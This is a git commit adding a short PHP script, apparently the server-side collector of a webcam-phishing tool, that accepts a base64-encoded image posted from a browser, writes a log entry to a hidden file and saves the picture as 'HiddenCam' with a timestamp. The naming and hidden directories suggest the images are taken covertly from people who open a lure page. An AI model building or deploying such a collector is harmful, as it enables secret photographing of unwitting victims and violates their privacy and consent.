8c8dae1dc245505d0db79568ac1bcbaec9ef2dcd
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2020-03-18 11:44:17 +0600

    Create post.php

---
+++ .dbfiles/cam/post.php
@@ -0,0 +1,18 @@
+<?php	
+
+$date = date('i_s_H-dMY');	
+$imageData=$_POST['cat'];	
+
+if (!empty($_POST['cat'])) {	
+error_log("Received" . "\r\n", 3, ".www/.cam.log");	
+
+}	
+
+$filteredData=substr($imageData, strpos($imageData, ",")+1);	
+$unencodedData=base64_decode($filteredData);	
+$fp = fopen( 'HiddenCam-'.$date.'.png', 'wb' );	
+fwrite( $fp, $unencodedData);	
+fclose( $fp );	
+
+exit();	
+?>	
